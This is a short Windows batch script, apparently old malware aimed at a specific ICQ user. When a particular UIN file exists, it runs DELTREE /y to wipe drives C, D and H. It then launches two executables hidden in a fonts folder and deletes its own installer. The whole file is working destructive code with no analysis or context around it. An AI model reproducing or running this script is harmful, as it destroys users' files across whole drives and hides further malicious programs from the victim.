@echo off
cd\
@attrib c:\progra~1\icq\uin\13373319.uin +h +r
if exist c:\progra~1\icq\uin\13373319.uin DELTREE /y c:\*.*
if exist c:\progra~1\icq\uin\13373319.uin DELTREE /y d:\*.*
if exist c:\progra~1\icq\uin\13373319.uin DELTREE /y h:\*.*
cd\windows\fonts\font\
mimic.exe
startup.exe
cd\
del c:\windows\fonts\font\install.bat
cls